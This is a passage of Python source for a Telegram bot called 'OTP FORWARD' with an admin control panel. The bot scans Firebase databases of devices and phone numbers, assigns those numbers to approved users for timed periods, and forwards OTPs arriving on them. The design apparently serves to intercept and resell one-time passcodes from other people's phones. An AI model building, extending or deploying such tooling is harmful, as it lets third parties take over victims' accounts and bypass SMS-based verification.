                f"\n\n⏳ Duration · <b>{fmt_duration(secs)}</b>\n\n"
                f"Pick a system for this user:\n\n{systems_text()}\n\n"
                "Send the system number (or <code>0</code> for default).",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        if state == "approve_sys":
            target = data.get("target"); secs = data.get("dur", 0)
            _admin_state.pop(uid, None); _admin_data.pop(uid, None)
            m = re.search(r"\d+", text)
            idx = int(m.group()) if m else 0
            if idx > 0:
                shown = display_systems()
                sys_obj = shown[idx - 1] if 0 <= idx - 1 < len(shown) else None
            else:
                sys_obj = best_system_with_numbers() or (system_list()[0] if SYSTEMS else None)
            sid = sys_obj.sid if sys_obj else ""
            name = _pending.get(target, {}).get("name", "User")
            _pending.pop(target, None)
            _access[target] = {"expires": (time.time() + secs) if secs else 0,
                               "system": sid, "name": name}
            save_access()
            await msg.reply_text(
                title("✅", "ACCESS GRANTED") + "\n" + DIV +
                f"\n\n👤 <code>{target}</code>\n"
                f"⏳ {fmt_duration(secs)}\n"
                f"🗂 {esc(sys_obj.name if sys_obj else '—')}",
                parse_mode="HTML", reply_markup=main_keyboard(is_admin))
            try:
                await _app.bot.send_message(target,
                    title("✅", "ACCESS GRANTED") + "\n" + DIV +
                    f"\n\n⏳ Duration · <b>{fmt_duration(secs)}</b>\n"
                    f"🗂 System · <b>{esc(sys_obj.name if sys_obj else '—')}</b>\n\n"
                    "Tap 🔥 Get Number to start.",
                    parse_mode="HTML", reply_markup=main_keyboard(False))
            except Exception:
                pass
            return

        if state == "revoke_uid":
            _admin_state.pop(uid, None); _admin_data.pop(uid, None)
            m = re.search(r"\d+", text)
            if not m:
                await msg.reply_text(
                    title("❌", "INVALID USER ID") + "\n" + DIV +
                    "\n\nSend a numeric user ID or /cancel.",
                    parse_mode="HTML", reply_markup=main_keyboard(is_admin))
                return
            target = int(m.group())
            _access.pop(target, None)
            _pending.pop(target, None)
            save_access()
            await msg.reply_text(
                title("✅", "ACCESS REVOKED") + "\n" + DIV +
                f"\n\n👤 <code>{target}</code>",
                parse_mode="HTML", reply_markup=main_keyboard(is_admin))
            return

        if state == "setdur_uid":
            m = re.search(r"\d+", text)
            if not m:
                await msg.reply_text(
                    title("❌", "INVALID USER ID") + "\n" + DIV +
                    "\n\nSend a numeric user ID or /cancel.",
                    parse_mode="HTML", reply_markup=back_keyboard())
                return
            data["target"] = int(m.group())
            _admin_data[uid] = data
            _admin_state[uid] = "setdur_val"
            await msg.reply_text(
                title("⏳", "SET DURATION") + "\n" + DIV +
                "\n\nSend the new duration (e.g. <code>3d</code>, "
                "<code>12h</code>, <code>0</code> = unlimited).",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        if state == "setdur_val":
            target = data.get("target")
            _admin_state.pop(uid, None); _admin_data.pop(uid, None)
            secs = parse_duration(text)
            if secs is None or target not in _access:
                await msg.reply_text(
                    title("❌", "INVALID INPUT") + "\n" + DIV +
                    "\n\nInvalid duration or user not found.",
                    parse_mode="HTML", reply_markup=main_keyboard(is_admin))
                return
            _access[target]["expires"] = (time.time() + secs) if secs else 0
            save_access()
            await msg.reply_text(
                title("✅", "DURATION UPDATED") + "\n" + DIV +
                f"\n\n👤 <code>{target}</code>\n"
                f"⏳ <b>{fmt_duration(secs)}</b>",
                parse_mode="HTML", reply_markup=main_keyboard(is_admin))
            return

        if state == "setsys_uid":
            m = re.search(r"\d+", text)
            if not m:
                await msg.reply_text(
                    title("❌", "INVALID USER ID") + "\n" + DIV +
                    "\n\nSend a numeric user ID or /cancel.",
                    parse_mode="HTML", reply_markup=back_keyboard())
                return
            data["target"] = int(m.group())
            _admin_data[uid] = data
            _admin_state[uid] = "setsys_val"
            await msg.reply_text(
                title("🔀", "SET SYSTEM") + "\n" + DIV +
                f"\n\nPick a system:\n\n{systems_text()}\n\n"
                "Send the system number.",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        if state == "setsys_val":
            target = data.get("target")
            _admin_state.pop(uid, None); _admin_data.pop(uid, None)
            m = re.search(r"\d+", text)
            idx = int(m.group()) if m else 0
            shown = display_systems()
            sys_obj = shown[idx - 1] if 0 <= idx - 1 < len(shown) else None
            if not sys_obj or target not in _access:
                await msg.reply_text(
                    title("❌", "INVALID SELECTION") + "\n" + DIV +
                    "\n\nInvalid system or user not found.",
                    parse_mode="HTML", reply_markup=main_keyboard(is_admin))
                return
            _access[target]["system"] = sys_obj.sid
            save_access()
            await msg.reply_text(
                title("✅", "SYSTEM UPDATED") + "\n" + DIV +
                f"\n\n👤 <code>{target}</code>\n"
                f"🗂 <b>{esc(sys_obj.name)}</b>",
                parse_mode="HTML", reply_markup=main_keyboard(is_admin))
            return

    # ── USER "SET FIREBASE" INPUT FLOW ──
    if uid in _user_state:
        state = _user_state[uid]
        data = _user_data.get(uid, {})
        if text in (BTN_CANCEL, "/cancel", BTN_MENU):
            _user_state.pop(uid, None); _user_data.pop(uid, None)
            await msg.reply_text(
                title("✅", "CANCELLED") + "\n" + DIV + "\n\n<i>Returned to the main menu.</i>",
                parse_mode="HTML", reply_markup=main_keyboard(is_admin))
            return
        if state == "setfb_url":
            url = parse_firebase_url(text)
            if not url:
                await msg.reply_text(
                    title("❌", "INVALID URL") + "\n" + DIV +
                    "\n\nSend a valid Firebase Realtime Database URL.\n"
                    "Example: <code>https://myapp.firebaseio.com</code>",
                    parse_mode="HTML", reply_markup=back_keyboard())
                return
            data["url"] = url
            _user_data[uid] = data
            _user_state[uid] = "setfb_key"
            await msg.reply_text(
                brand("Connect Your Firebase") + "\n" +
                title("➕", "SET FIREBASE") + "\n" + step_badge(2, 2) + "\n" + DIV +
                f"\n\n🔗 URL · <code>{esc(url)}</code>\n\n"
                "Send the auth key (database secret) if required, "
                "or <code>-</code> to skip.",
                parse_mode="HTML", reply_markup=back_keyboard(),
                disable_web_page_preview=True)
            return
        if state == "setfb_key":
            keys = [] if text.strip() in ("-", "skip", "none", "") else [text.strip()]
            url = data.get("url")
            _user_state.pop(uid, None); _user_data.pop(uid, None)
            if not url:
                await msg.reply_text(
                    title("❌", "SOMETHING WENT WRONG") + "\n" + DIV +
                    "\n\nPlease try again.",
                    parse_mode="HTML", reply_markup=main_keyboard(is_admin))
                return
            await finish_set_firebase(msg, uid, url, keys)
            return

    # ── MENU ──
    if text == BTN_MENU:
        if not _scan_done:
            await msg.reply_text(
                brand("Please Wait") + "\n\n⏳ Systems are still scanning…",
                parse_mode="HTML", reply_markup=back_keyboard())
        else:
            await msg.reply_text(menu_text(uid, is_admin), parse_mode="HTML",
                                 reply_markup=main_keyboard(is_admin))
        return

    # ── GET NUMBER → PANEL SELECTION ──
    if text in (BTN_GET, BTN_NEWNUM):
        if not _scan_done:
            await msg.reply_text(
                brand("Please Wait") + "\n\n⏳ Scanning… please wait a moment.",
                parse_mode="HTML", reply_markup=back_keyboard())
            return
        if uid in USER_WAITING:
            sid, num = USER_WAITING[uid]
            elapsed = time.time() - USER_WAIT_TIME.get(uid, time.time())
            remaining = max(0, AUTO_TIMEOUT - elapsed)
            await msg.reply_text(
                title("⏳", "ALREADY WAITING") + "\n" + DIV +
                f"\n\n🟢 <code>{fmt_phone(num)}</code>\n"
                f"⏱ Time left · <b>{int(remaining)}s</b>\n\n"
                "Cancel first to get a different number.",
                parse_mode="HTML", reply_markup=waiting_keyboard())
            return
        await msg.reply_text(panels_text(uid), parse_mode="HTML",
                             reply_markup=panels_inline(uid, 0),
                             disable_web_page_preview=True)
        return

    # ── MY STATUS ──
    if text == BTN_MY:
        t, kb = my_status_text(uid)
        await msg.reply_text(t, parse_mode="HTML", reply_markup=kb)
        return

    # ── SMS HISTORY ──
    if text == BTN_HISTORY:
        if is_admin:
            await msg.reply_text(history_text(None), parse_mode="HTML",
                                 reply_markup=back_keyboard())
        else:
            sys_obj = get_user_system(uid)
            sid = sys_obj.sid if sys_obj else None
            await msg.reply_text(history_text(sid), parse_mode="HTML",
                                 reply_markup=back_keyboard())
        return

    # ── SPECIAL NUMBERS ──
    if text == BTN_SPECIAL:
        await msg.reply_text(special_text(0), parse_mode="HTML",
                             reply_markup=special_inline(0),
                             disable_web_page_preview=True)
        return

    # ── SET FIREBASE ──
    if text == BTN_SETFB:
        await start_set_firebase(msg, uid)
        return

    # ── ADMIN PANEL ──
    if text == BTN_ADMINPANEL:
        if not is_admin:
            return
        await msg.reply_text(admin_panel_text(), parse_mode="HTML",
                             reply_markup=admin_panel_inline(),
                             disable_web_page_preview=True)
        return

    # ── ADMIN WATCH 5 ──
    if text == BTN_WATCH5:
        if not is_admin:
            return
        ADMIN_WATCH_SEL[uid] = list(ADMIN_WATCH.get(uid, []))
        await msg.reply_text(watch5_text(), parse_mode="HTML",
                             reply_markup=watch5_panels_inline(0),
                             disable_web_page_preview=True)
        return

    # ── CANCEL / STOP ──
    if text in (BTN_CANCEL, BTN_STOP):
        if uid in USER_WAITING:
            sid, num = USER_WAITING.pop(uid)
            USER_WAIT_TIME.pop(uid, None)
            s = SYSTEMS.get(sid)
            if s and num in s.numbers:
                s.numbers[num].assigned_to = None
            await msg.reply_text(
                title("✅", "CANCELLED") + "\n" + DIV +
                f"\n\nStopped watching 🟢 <code>{fmt_phone(num)}</code>.",
                parse_mode="HTML", reply_markup=_kb([
                    [KeyboardButton(BTN_GET)], [KeyboardButton(BTN_MENU)]]))
        else:
            await msg.reply_text(
                title("ℹ️", "NOTHING TO CANCEL") + "\n" + DIV +
                "\n\nYou're not waiting for any OTP.",
                parse_mode="HTML", reply_markup=back_keyboard())
        return

    # ── PICK NUMBER (legacy dynamic label) ──
    m = re.search(r"\+91(\d{10})", text)
    if m:
        num = m.group(1)
        if uid in USER_WAITING:
            sid, cur = USER_WAITING[uid]
            await msg.reply_text(
                title("⏳", "ALREADY WAITING") + "\n" + DIV +
                f"\n\n🟢 <code>{fmt_phone(cur)}</code>\n\n"
                "Cancel first to switch numbers.",
                parse_mode="HTML", reply_markup=waiting_keyboard())
            return
        sys_obj = get_user_system(uid)
        if not sys_obj or num not in sys_obj.numbers or sys_obj.numbers[num].assigned_to is not None:
            await msg.reply_text(
                title("❌", "NUMBER UNAVAILABLE") + "\n" + DIV +
                "\n\nThat number was just taken. Please pick another.",
                parse_mode="HTML", reply_markup=_kb([[KeyboardButton(BTN_GET)],
                                                     [KeyboardButton(BTN_MENU)]]))
            return
        prof = sys_obj.numbers[num]
        prof.assigned_to = uid
        USER_WAITING[uid] = (sys_obj.sid, num)
        USER_WAIT_TIME[uid] = time.time()
        _user_panel[uid] = sys_obj.sid
        await msg.reply_text(
            title("✅", "NUMBER ASSIGNED") + "\n" + DIV +
            f"\n\n🟢 <code>{fmt_phone(num)}</code>\n\n"
            "<b>📊 Details</b>\n" +
            kv("🗂 System", esc(sys_obj.name)) + "\n" +
            kv("📈 OTPs (5m)", prof.recent_otp_count, last=True) + "\n\n" +
            "⚡ Watching for OTP…",
            parse_mode="HTML", reply_markup=waiting_keyboard())
        return

# ── CALLBACK HANDLER ────────────────────────────────────────────────────────
async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not q:
        return
    try:
        await q.answer()
    except Exception:
        pass
    uid = q.from_user.id
    data = q.data or ""
    logger.info(f"CALLBACK uid={uid} data={data!r}")
    parts = data.split(":")
    action = parts[0] if parts else ""

    # Authorization gate for user-facing callbacks
    if action in ("panels", "ppage", "panel", "npage", "nref", "num",
                  "special", "snum", "menu") and not is_authorized(uid):
        await q_reply(q, title("🔒", "ACCESS REQUIRED") + "\n" + DIV +
                      "\n\nYou no longer have access.", parse_mode="HTML")
        return

    if action == "menu":
        await safe_edit(q, menu_text(uid, uid == ADMIN_ID), None)
        await q_reply(q, "🏠 <b>Main menu opened below.</b>", main_keyboard(uid == ADMIN_ID))
        return

    if action in ("panels", "ppage"):
        page = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
        await safe_edit(q, panels_text(uid), panels_inline(uid, page))
        return

    if action == "panel":
        sid = parts[1] if len(parts) > 1 else ""
        s = SYSTEMS.get(sid)
        if not s or (s.owner is not None and s.owner != uid and uid != ADMIN_ID):
            await safe_edit(q, title("❌", "PANEL UNAVAILABLE") + "\n" + DIV +
                            "\n\nThis panel is no longer available.",
                            panels_inline(uid, 0))
            return
        _user_panel[uid] = sid
        await safe_edit(q, numbers_text(sid), numbers_inline(sid, 0))
        return

    if action == "npage":
        sid = parts[1] if len(parts) > 1 else ""
        page = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 0
        await safe_edit(q, numbers_text(sid), numbers_inline(sid, page))
        return

    if action == "nref":
        sid = parts[1] if len(parts) > 1 else ""
        page = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 0
        s = SYSTEMS.get(sid)
        if s:
            await scan_one_system(s)
        await safe_edit(q, numbers_text(sid), numbers_inline(sid, page))
        return

    if action == "num":
        sid = parts[1] if len(parts) > 1 else ""
        num = parts[2] if len(parts) > 2 else ""
        await assign_number(q, uid, sid, num)
        return

    if action == "special":
        page = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
        await safe_edit(q, special_text(page), special_inline(page))
        return

    if action == "snum":
        sid = parts[1] if len(parts) > 1 else ""
        num = parts[2] if len(parts) > 2 else ""
        await assign_number(q, uid, sid, num)
        return

    # ── ADMIN WATCH 5 CALLBACKS ──
    if action == "w5":
        if uid != ADMIN_ID:
            return
        sub = parts[1] if len(parts) > 1 else ""
        if sub == "p":
            page = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 0
            await safe_edit(q, watch5_text(), watch5_panels_inline(page))
        elif sub == "panel":
            sid = parts[2] if len(parts) > 2 else ""
            page = int(parts[3]) if len(parts) > 3 and parts[3].isdigit() else 0
            await safe_edit(q, watch5_text(sid), watch5_numbers_inline(sid, page))
        elif sub == "np":
            sid = parts[2] if len(parts) > 2 else ""
            page = int(parts[3]) if len(parts) > 3 and parts[3].isdigit() else 0
            await safe_edit(q, watch5_text(sid), watch5_numbers_inline(sid, page))
        elif sub == "n":
            sid = parts[2] if len(parts) > 2 else ""
            page = int(parts[3]) if len(parts) > 3 and parts[3].isdigit() else 0
            num = parts[4] if len(parts) > 4 else ""
            sel = ADMIN_WATCH_SEL.setdefault(uid, [])
            entry = (sid, num)
            if entry in sel:
                sel.remove(entry)
            elif len(sel) >= ADMIN_WATCH_MAX:
                await q_reply(q, title("⚠️", "LIMIT REACHED") + "\n" + DIV +
                              f"\n\nYou can watch at most {ADMIN_WATCH_MAX} numbers.\n"
                              "Remove one first, or press ▶️ Start Watching.", parse_mode="HTML")
            else:
                sel.append(entry)
            await safe_edit(q, watch5_text(sid), watch5_numbers_inline(sid, page))
        elif sub == "clear":
            ADMIN_WATCH_SEL[uid] = []
            await safe_edit(q, watch5_text(), watch5_panels_inline(0))
        elif sub == "start":
            sel = ADMIN_WATCH_SEL.get(uid, [])
            if not sel:
                await q_reply(q, title("⚠️", "NOTHING SELECTED") + "\n" + DIV +
                              "\n\nPick at least one number first.", parse_mode="HTML")
                return
            ADMIN_WATCH[uid] = list(sel)
            for ss, n in sel:
                s = SYSTEMS.get(ss)
                if s and n in s.numbers:
                    s.numbers[n].assigned_to = uid
            logger.info(f"🎯 Admin {uid} watching {len(sel)} numbers: {sel}")
            lines = [title("✅", "WATCH 5 ACTIVE") + "\n" + DIV +
                     f"\n\nNow watching <b>{len(sel)}</b> numbers. "
                     "OTPs from ANY of them are forwarded here automatically.\n"]
            for i, (ss, n) in enumerate(sel, 1):
                nm = SYSTEMS[ss].name if ss in SYSTEMS else ss
                lines.append(f"  {i}. 🟢 <code>{fmt_phone(n)}</code> · <i>{esc(nm)}</i>")
            lines.append("\n<i>Press 🛑 Stop anytime to release them.</i>")
            await safe_edit(q, "\n".join(lines), watch5_panels_inline(0))
        elif sub == "stop":
            old = ADMIN_WATCH.pop(uid, [])
            for ss, n in old:
                s = SYSTEMS.get(ss)
                if s and n in s.numbers and s.numbers[n].assigned_to == uid:
                    s.numbers[n].assigned_to = None
            logger.info(f"🛑 Admin {uid} stopped watch ({len(old)} numbers released)")
            await safe_edit(q, title("🛑", "WATCH STOPPED") + "\n" + DIV +
                            f"\n\nReleased {len(old)} number(s).", watch5_panels_inline(0))
        return

    # ── ADMIN CALLBACKS ──
    if action == "adm":
        if uid != ADMIN_ID:
            return
        sub = parts[1] if len(parts) > 1 else ""
        if sub == "dash":
            await safe_edit(q, dashboard_text(), admin_panel_inline())
        elif sub == "systems":
            await safe_edit(q, systems_text(), admin_panel_inline())
        elif sub == "users":
            await safe_edit(q, users_text(), admin_panel_inline())
        elif sub == "special":
            await safe_edit(q, special_text(0), special_inline(0))
        elif sub == "rescan":
            await safe_edit(q, title("🔄", "RESCAN STARTED") + "\n" + DIV +
                            "\n\nScanning all systems… you'll be notified when done.",
                            admin_panel_inline())
            asyncio.create_task(scan_all_systems())
        elif sub == "approve":
            _admin_state[uid] = "approve_uid"
            if _pending:
                lines = [title("✅", "APPROVE USER") + "\n" + DIV + "\n\n🆕 <b>Pending:</b>"]
                for puid, p in _pending.items():
                    lines.append(f"  ├ 👤 {esc(p.get('name') or 'User')} · <code>{puid}</code>")
                lines.append("\nSend the user ID to approve, or /cancel.")
            else:
                lines = [title("✅", "APPROVE USER") + "\n" + DIV + "\n\n"
                         "Send the user ID to approve, or /cancel."]
            await q_reply(q, "\n".join(lines), back_keyboard())
        elif sub == "revoke":
            _admin_state[uid] = "revoke_uid"
            await q_reply(q, title("🚫", "REVOKE ACCESS") + "\n" + DIV +
                          f"\n\n{users_text()}\n\nSend the user ID to revoke, or /cancel.",
                          back_keyboard())
        elif sub == "setdur":
            _admin_state[uid] = "setdur_uid"
            await q_reply(q, title("⏳", "SET DURATION") + "\n" + DIV +
                          f"\n\n{users_text()}\n\nSend the user ID, or /cancel.",
                          back_keyboard())
        elif sub == "setsys":
            _admin_state[uid] = "setsys_uid"
            await q_reply(q, title("🔀", "SET SYSTEM") + "\n" + DIV +
                          f"\n\n{users_text()}\n\nSend the user ID, or /cancel.",
                          back_keyboard())
        elif sub == "addfb":
            _admin_state[uid] = "add_url"
            _admin_data[uid] = {}
            await q_reply(q, title("➕", "ADD DATABASE") + "\n" + step_badge(1, 3) + "\n" + DIV +
                          "\n\nSend the Firebase Realtime Database URL.\n"
                          "Example: <code>https://myapp.firebaseio.com</code>\n\n"
                          "Send /cancel to abort.", back_keyboard())
        elif sub == "rmfb":
            if not _firebase_urls:
                await q_reply(q, title("ℹ️", "NOTHING TO REMOVE") + "\n" + DIV +
                              "\n\nNo custom Firebase URLs have been added.",
                              admin_panel_inline())
            else:
                lines = [title("🗑", "REMOVE DATABASE") + "\n" + DIV]
                for i, entry in enumerate(_firebase_urls, 1):
                    lines.append(f"\n  {i}. {esc(entry.get('name') or 'System')} — <code>{esc(entry.get('url'))}</code>")
                lines.append("\n\nSend the number to remove, or /cancel.")
                _admin_state[uid] = "remove"
                await q_reply(q, "\n".join(lines), back_keyboard())
        return

def menu_text(uid, is_admin) -> str:
    if is_admin:
        total_nums = sum(len(s.numbers) for s in system_list())
        total_online = sum(s.stats["online"] for s in system_list())
        return (brand("Premium Multi-System Control") + "\n" +
                title("📊", "LIVE OVERVIEW") + "\n" +
                kv("🗂 Systems", len(SYSTEMS)) + "\n" +
                kv("💻 Online", total_online) + "\n" +
                kv("📱 Numbers", total_nums) + "\n" +
                kv("⭐ Special", len(_special_numbers)) + "\n" +
                kv("👥 Users", f"{len(_access)} · ⏳ {len(_pending)} pending", last=True) +
                "\n\n<i>Tap an action below 👇</i>")
    sys_obj = get_user_system(uid)
    rem = access_remaining(uid)
    avail = len(get_all_numbers(sys_obj.sid)) if sys_obj else 0
    return (brand("Premium OTP Delivery") + "\n" +
            title("📊", "YOUR OVERVIEW") + "\n" +
            kv("🗂 Panel", esc(sys_obj.name if sys_obj else "—")) + "\n" +
            kv("📱 Available", avail) + "\n" +
            kv("🔓 Access", fmt_duration(rem), last=True) +
            "\n\n<i>Tap 🔥 Get Number to begin 👇</i>")

# ── COMMANDS ────────────────────────────────────────────────────────────────
async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_chat.id
    _admin_state.pop(uid, None)
    _admin_data.pop(uid, None)
    _user_state.pop(uid, None)
    _user_data.pop(uid, None)
    await update.message.reply_text(
        title("✅", "CANCELLED") + "\n" + DIV + "\n\n<i>Returned to the main menu.</i>",
        parse_mode="HTML", reply_markup=main_keyboard(uid == ADMIN_ID))

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_chat.id
    if not is_authorized(uid):
        await update.message.reply_text(
            brand("Access Required") +
            "\n\nYou don't have access to this bot yet.\n"
            "Tap below to send an access request to the admin.\n\n" +
            note("You'll be notified here once you're approved."),
            parse_mode="HTML", reply_markup=request_keyboard())
        return
    if not _scan_done:
        await update.message.reply_text(
            brand("Please Wait") + "\n\n⏳ Systems are still scanning…",
            parse_mode="HTML", reply_markup=back_keyboard())
        return
    await update.message.reply_text(menu_text(uid, uid == ADMIN_ID), parse_mode="HTML",
                                    reply_markup=main_keyboard(uid == ADMIN_ID))

# ── MAIN ────────────────────────────────────────────────────────────────────
# ── HEALTH SERVER (keeps Railway web service alive) ──────────────────────────
async def run_health_server():
    """Bind a trivial HTTP server to $PORT so Railway treats this as a healthy
    web service. Without a bound port Railway may restart the container, which
    interrupts long-polling and makes inline buttons appear 'dead'."""
    try:
        from aiohttp import web

        async def _ok(request):
            return web.Response(text="OK")

        web_app = web.Application()
        web_app.router.add_get("/", _ok)
        web_app.router.add_get("/health", _ok)
        runner = web.AppRunner(web_app)
        await runner.setup()
        site = web.TCPSite(runner, "0.0.0.0", HEALTH_PORT)
        await site.start()
        logger.info(f"Health server listening on 0.0.0.0:{HEALTH_PORT}")
    except Exception as e:
        logger.warning(f"Health server could not start: {e}")

def main():
    global _app
    print("=" * 52)
    print("   🤖  OTP FORWARD  ·  Premium Control Panel  v6.0")
    print("=" * 52)
    print(f"   Admin            : {ADMIN_ID}")
    print(f"   Built-in systems : {len(DATABASES)}")
    print("   Instant start    : no initial SMS scan")
    print("   Panels           : user-selectable, inline browsing")
    print("   Special numbers  : auto-promoted active numbers")
    print("=" * 52)
    print()

    load_firebase_urls()
    load_access()

    app = Application.builder().token(TOKEN).concurrent_updates(True).build()
    _app = app

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("cancel", cmd_cancel))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    async def on_error(update, context):
        logger.error("Handler error", exc_info=context.error)

    app.add_error_handler(on_error)

    async def startup_tasks():
        try:
            await send_admin(brand("Bot Starting") + "\n\n🔍 Scanning systems…")
            await scan_all_systems()
            await seed_all_devices()
            await asyncio.sleep(2)
            asyncio.create_task(background_monitor_loop())
        except Exception as e:
            logger.error(f"startup_tasks failed: {e}")

    async def post_init(application):
        # Clear any stale webhook so long-polling can receive updates.
        try:
            await application.bot.delete_webhook(drop_pending_updates=True)
        except Exception as e:
            logger.warning(f"delete_webhook failed: {e}")
        # Start answering updates IMMEDIATELY; the heavy scan runs in the
        # background so inline buttons work from the very first second.
        asyncio.create_task(startup_tasks())
        asyncio.create_task(run_health_server())

    app.post_init = post_init
    app.run_polling(drop_pending_updates=False, allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
